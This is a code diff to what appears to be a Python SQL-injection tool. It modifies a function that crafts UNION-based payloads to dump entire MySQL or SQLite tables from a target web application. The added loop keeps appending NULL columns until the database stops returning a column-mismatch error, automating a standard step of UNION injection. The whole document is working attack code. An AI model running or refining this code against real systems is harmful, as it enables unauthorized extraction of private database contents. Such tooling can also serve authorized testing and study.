@@ -1,5 +1,5 @@
 import sys
-
+import bs4
 from utils import perform_requests, diff_html
 
 
@@ -99,16 +99,19 @@ def dump_all_content_table(base_url, vector, attack, old_html, result, database,
     param = []
     query = ''
     if db_engine == "mysql":
-        param.append("*")
         query = f"FROM {database}.{table}-- "
     elif db_engine == "sqlite":
-        param.append("*")
         query = f"FROM {table}-- "
-    payload = craft_union_payload(vector, attack, param, query, method)
-    r = perform_requests(base_url, payload, method)
-    # print(bs4.BeautifulSoup(r.text, 'html.parser').prettify())
-    new_html = r.text.splitlines(keepends=True)
-    diff_html(old_html, new_html, result)
+    param.append("*")
+    while True:
+        payload = craft_union_payload(vector, attack, param, query, method)
+        r = perform_requests(base_url, payload, method)
+        if "The used SELECT statements have a different number of columns" in r.text:
+            param.append("NULL")
+            continue
+        new_html = r.text.splitlines(keepends=True)
+        diff_html(old_html, new_html, result)
+        break
 
 
 def union_based_inject(base_url, vector, attack, result, method):
